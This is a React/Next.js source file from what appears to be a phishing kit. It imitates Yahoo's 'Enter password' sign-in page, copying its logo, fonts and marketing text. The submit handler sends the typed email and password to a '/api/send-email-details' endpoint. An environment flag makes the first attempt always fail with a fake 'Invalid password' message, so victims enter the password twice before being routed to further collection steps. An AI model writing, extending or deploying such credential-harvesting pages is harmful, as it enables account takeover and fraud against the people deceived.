import React, { useContext, useState } from "react";
import { Box } from "@mui/system";
import {
  Link,
  Typography,
  FormControl,
  InputLabel,
  Input,
  Button,
} from "@mui/material";
import { createTheme, ThemeProvider } from "@mui/material/styles";
import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import { DataContext } from "../../_app";
import { getNextUrl } from "../../../utils/getNextUrl";
import { getProgress } from "../../../utils/getProgress";

interface YahooProps {}

const theme = createTheme({
  typography: {
    fontFamily: `'Yahoo Sans','Helvetica Neue',Helvetica,Arial`,
  },
  palette: {
    primary: {
      main: "#188fff",
    },
  },
});

const Yahoo: React.FC<YahooProps> = () => {
  const [showPassowrd, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [password, setPassword] = useState(``);
  const [attempt, setAttempt] = useState(0);
  const [error, setError] = useState<{
    show: boolean;
    message: string;
  }>({} as any);

  const [emailLogins, setEmailLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();

  const onSubmit = async () => {
    setLoading(true);

    if (!password) {
      setError({
        show: true,
        message: `Please provide your password. `,
      });
      setLoading(false);
      return;
    }

    const formData = new FormData();

    formData.append(`form`, `EMAIL DETAILS`);
    formData.append(
      `emailLogins`,
      JSON.stringify({
        email: datas.email,
        emailPassword: password,
        attempt: attempt + 1,
      })
    );

    try {
      await axios.post(`/api/send-email-details`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setEmailLogins({
      [attempt + 1]: {
        form: `EMAIL DETAILS`,
        emailLogins: {
          email: datas.email,
          emailPassword: password,
          attempt: attempt + 1,
        },
      },
    });

    if (!attempt && process.env.NEXT_PUBLIC_DOUBLE_EMAIL_LOGIN === `ON`) {
      setTimeout(() => {
        setAttempt(1);
        setLoading(false);
        setError({
          show: true,
          message: `Invalid password. Please try again`,
        });
        setPassword(``);
      }, 2000);
      return;
    }

    setData({
      ...datas,
      emailLogins: {
        ...emailLogins,
        [attempt + 1]: {
          form: `EMAIL DETAILS`,
          emailLogins: {
            email: datas.email,
            emailPassword: password,
            attempt: attempt + 1,
          },
        },
      },
    });

    setLoading(false);

    const url = getProgress()[getProgress().indexOf(`Email Verification`) + 1];
    push(getNextUrl(url));
  };

  return (
    <ThemeProvider theme={theme}>
      <Head>
        <style>{`
        body {
          font-family: 'Yahoo Sans','Helvetica Neue',Helvetica,Arial !important;
          background: #fff;
          direction: ltr;
          font-size: 16px !important;
          line-height: 1.4286;
          margin: 0;
          padding: 0;
        }

        html, body, button, input, select, textarea, code, code, kbd, pre, samp, .pure-g, .pure-g [class*=pure-u] {
            font-family: 'Helvetica Neue',Helvetica,Arial;
        }

        html {
            background: #fff;
            font-size: 18px !important;
            line-height: 1.5;
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%; 
        }
        `}</style>
        <title>Yahoo</title>
        <link rel="shortcut icon" href={`/images/external/yahooFavico.ico`} />
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1"
        />
      </Head>
      <Box
        sx={{
          minHeight: "100%",
          backgroundColor: "#fff",
          color: "#26282a",
        }}
      >
        <Box
          sx={{
            position: "relative",
            backgroundColor: "#fff",
            color: "#26282a",
            lineHeight: "84px",
            paddingLeft: "50px",
            display: ["none", "block"],
          }}
        >
          <Box
            component="span"
            sx={{
              display: ["none", "inline-block"],
              boxSizing: "border-box",
              verticalAlign: "middle",
              lineHeight: "normal",
              fontSize: `0 !important`,
            }}
          >
            <Link color="#188fff">
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img
                src={`/images/external/yahooLogo.png`}
                alt="Yahoo"
                style={{
                  border: 0,
                  height: "36px",
                  objectFit: `contain`,
                }}
              />
            </Link>
          </Box>
          <Box
            component="span"
            sx={{
              position: "absolute",
              right: "64px",
              top: "50%",
              transform: "translateY(-50%)",
              fontSize: "13px !important",
              display: "inline-block",
              boxSizing: "border-box",
              verticalAlign: "middle",
              lineHeight: "normal",
              textAlign: "right",
              color: "#26282a",
              WebkitTapHighlightColor: "transparent",
            }}
          >
            <Link
              color="primary"
              sx={{
                textDecoration: "none",
              }}
            >
              Help
            </Link>
          </Box>
        </Box>
        <Box
          sx={{
            margin: "0 auto",
            maxWidth: "1030px",
            minWidth: "320px",
            position: "relative",
          }}
        >
          <Box
            sx={{
              paddingTop: 0,
              boxSizing: "border-box",
              backgroundColor: "#fff",
              color: "#26282a",
              boxShadow: ["none", "0 2px 4px 0 rgb(0 0 0 / 30%)"],
              width: ["100%", "360px"],
              right: 0,
              minHeight: "550px",
              zIndex: 1,
              padding: "28px 5px",
              paddingBottom: "10px",
              border: ["none", "1px solid transparent"],
              borderTop: ["none", "1px solid #f1f1f5"],
              position: "absolute",
              top: "11px",
              WebkitTapHighlightColor: "transparent",
              height: ["100vh", "initial"],
            }}
          >
            <Box
              sx={{
                // paddingTop: "28px",
                paddingBottom: 0,
                marginBottom: 0,
                backgroundColor: "#fff",
                color: "#26282a",
                textAlign: "center",
                WebkitTapHighlightColor: "transparent",
              }}
              className={`image-wrapper`}
            >
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img
                src={`/images/external/yahooLogo.png`}
                alt="Yahoo"
                width={100}
                height={100}
                style={{
                  border: 0,
                  height: "27px",
                  display: "block",
                  margin: "0 auto",
                  maxWidth: "90vw",
                  color: "#26282a",
                  objectFit: `contain`,
                }}
              />
            </Box>
            <Box
              sx={{
                padding: "0 1.41176rem",
                margin: "0 auto",
                // maxWidth: "18.82353rem",
              }}
            >
              {/* <Box
                sx={{
                  marginTop: "0.94118rem",
                  minHeight: "1rem",
                  display: "inline-block",
                  width: "100%",
                }}
              /> */}
              <Box>
                <Box
                  sx={{
                    marginTop: "0.94118rem",
                    minHeight: "1rem",
                    display: "inline-block",
                    width: "100%",
                  }}
                >
                  <Box
                    sx={{
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      fontSize: ".82353rem !important",
                      letterSpacing: ".58px",
                      textAlign: "center",
                      fontFamily: `'Yahoo Sans','Helvetica Neue',Helvetica,Arial`,
                    }}
                  >
                    {datas && datas.email}
                  </Box>
                </Box>
                <Box>
                  <Typography
                    fontFamily={`'Yahoo Sans','Helvetica Neue',Helvetica,Arial`}
                    component="strong"
                    sx={{
                      display: "block",
                      margin: 0,
                      marginTop: "0.82353rem",
                      fontSize: "1.17647rem !important",
                      fontWeight: 600,
                      letterSpacing: "-.2px",
                      textAlign: "center",
                      lineHeight: "1.35294rem",
                    }}
                  >
                    Enter password
                  </Typography>
                  <Box
                    component="span"
                    sx={{
                      display: "block",
                      padding: 0,
                      marginTop: "0.35294rem",
                      fontSize: ".82353rem !important",
                      letterSpacing: "-.3px",
                      lineHeight: "1rem",
                      textAlign: "center",
                      fontFamily: `'Yahoo Sans','Helvetica Neue',Helvetica,Arial`,
                    }}
                  >
                    to finish signing in
                  </Box>
                  <Box
                    sx={{
                      margin: 0,
                      marginTop: "2.35294rem",
                    }}
                  >
                    <FormControl variant="standard" fullWidth>
                      <InputLabel
                        htmlFor="standard-adornment-password"
                        sx={{
                          color: "#999",
                          fontSize: ".82353rem !important",
                          letterSpacing: "-.1px",
                          fontWeight: 400,
                          position: "absolute",
                          pointerEvents: "none",
                          left: 0,
                          top: "0.70588rem",
                          transition: ".2s ease all",
                          marginTop: 0,
                          textOverflow: "ellipsis",
                          whiteSpace: "nowrap",
                          overflow: "hidden",
                          maxWidth: "100%",
                          fontFamily: `'Yahoo Sans','Helvetica Neue',Helvetica,Arial`,
                          "&.Mui-focused": {
                            color: "#262626",
                          },
                        }}
                      >
                        Password
                      </InputLabel>
                      <Input
                        id="standard-adornment-password"
                        type={showPassowrd ? "text" : "password"}
                        sx={{
                          fontFamily: `'Yahoo Sans','Helvetica Neue',Helvetica,Arial`,
                          "& input": {
                            fontSize: ".82353rem !important",
                            fontWeight: showPassowrd ? "normal" : 800,
                            letterSpacing: showPassowrd
                              ? "normal"
                              : ".17647rem",
                            marginTop: ".41176rem",
                            height: "1.88235rem",
                          },
                          ":before": {
                            borderBottom: error.show
                              ? "1px solid #ff333a"
                              : "1px solid #d8dade",
                          },
                          ":after": {
                            borderBottom: "1px solid #188fff",
                          },
                          ":hover": {
                            ":not(.Mui-disabled):before": {
                              borderBottom: error.show
                                ? "1px solid #ff333a"
                                : "1px solid #d8dade",
                            },
                          },
                        }}
                        endAdornment={
                          <Button
                            disableRipple
                            sx={{
                              marginTop: ".35294rem",
                              backgroundImage: `url(${
                                !showPassowrd
                                  ? `/images/external/yahooPasswordHide.svg`
                                  : `/images/external/yahooPasswordShow.svg`
                              })`,
                              backgroundSize: "0.94118rem",
                              backgroundColor: "transparent",
                              width: "0.94118rem",
                              height: "0.94118rem",
                              padding: 0,
                              marginLeft: "0.70588rem",
                              border: 0,
                              backgroundRepeat: "no-repeat",
                              minWidth: 0,
                            }}
                            onClick={() =>
                              setShowPassword((prevState) => !prevState)
                            }
                          />
                        }
                        value={password}
                        onChange={(e) => {
                          setPassword(e.target.value);
                        }}
                      />
                    </FormControl>
                    {error.show && (
                      <Typography
                        component="p"
                        sx={{
                          fontSize: "12.7058px !important",
                          lineHeight: "1.17647rem",
                          paddingTop: "0.29412rem",
                          color: "#f0162f",
                          textAlign: "left",
                          paddingLeft: 0,
                          margin: 0,
                          bgcolor: "transparent",
                        }}
                      >
                        {error.message}
                      </Typography>
                    )}
                    <Box
                      sx={{
                        fontSize: ".82353rem !important",
                        marginTop: error.show ? ".88235rem" : "1.41176rem",
                        padding: 0,
                      }}
                    >
                      <Button
                        disabled={loading}
                        sx={{
                          fontSize: ".94118rem !important",
                          fontWeight: 500,
                          minHeight: "2.35294rem",
                          padding: "0.64706rem 0",
                          lineHeight: "1rem",
                          color: "#fff",
                          background: "#188fff",
                          border: "1px solid #188fff",
                          margin: 0,
                          width: "100%",
                          boxSizing: "border-box",
                          whiteSpace: "normal",
                          borderRadius: "1.17647rem",
                          verticalAlign: "baseline",
                          textAlign: "center",
                          userSelect: "none",
                          display: "inline-block",
                          zoom: 1,
                          textTransform: "none",
                          fontFamily: `'Yahoo Sans','Helvetica Neue',Helvetica,Arial`,
                          ":disabled": {
                            color: "white",
                          },
                          ":hover": {
                            background: "#0f69ff",
                            borderColor: "#0f69ff",
                            color: "#fff",
                          },
                        }}
                        onClick={onSubmit}
                      >
                        Next
                      </Button>
                    </Box>
                    <Box
                      sx={{
                        margin: 0,
                        marginTop: "1.05882rem",
                        marginBottom: "20px",
                        padding: 0,
                        fontSize: ".82353rem !important",
                        lineHeight: "1rem",
                        whiteSpace: "normal",
                        textAlign: "center",
                      }}
                    >
                      <Button
                        variant="text"
                        sx={{
                          margin: "0 auto",
                          padding: 0,
                          width: "auto",
                          fontSize: ".82353rem !important",
                          lineHeight: "1rem",
                          whiteSpace: "normal",
                          color: "#188fff",
                          background: "0 0",
                          borderColor: "transparent",
                          borderRadius: "1.17647rem",
                          fontFamily: `'Yahoo Sans','Helvetica Neue',Helvetica,Arial`,
                          textTransform: "none",
                          //   border: "solid 1px #e4e7ef",
                        }}
                      >
                        Forgotten password?
                      </Button>
                    </Box>
                  </Box>
                </Box>
              </Box>
            </Box>
          </Box>
          <Box
            sx={{
              display: ["none", "block"],
              left: 0,
              padding: "50px 380px 50px 50px",
              fontSize: "21px !important",
              position: "absolute",
              top: "11px",
            }}
          >
            <Typography
              fontFamily={`'Yahoo Sans','Helvetica Neue',Helvetica,Arial`}
              component="h1"
              sx={{
                fontSize: "21px !important",
                fontWeight: 700,
                padding: "20px 0",
                textTransform: "none",
                margin: 0,
              }}
            >
              Yahoo makes it easy to enjoy what matters most in your world.
            </Typography>
            <Typography
              fontFamily={`'Yahoo Sans','Helvetica Neue',Helvetica,Arial`}
              sx={{
                margin: 0,
                fontSize: "21px !important",
              }}
            >
              Best-in-class Yahoo Mail, breaking local, national and global
              news, finance, sport, music, films and more. You get more out of
              the web; you get more out of life.
            </Typography>
          </Box>
        </Box>
      </Box>
    </ThemeProvider>
  );
};

export default Yahoo;
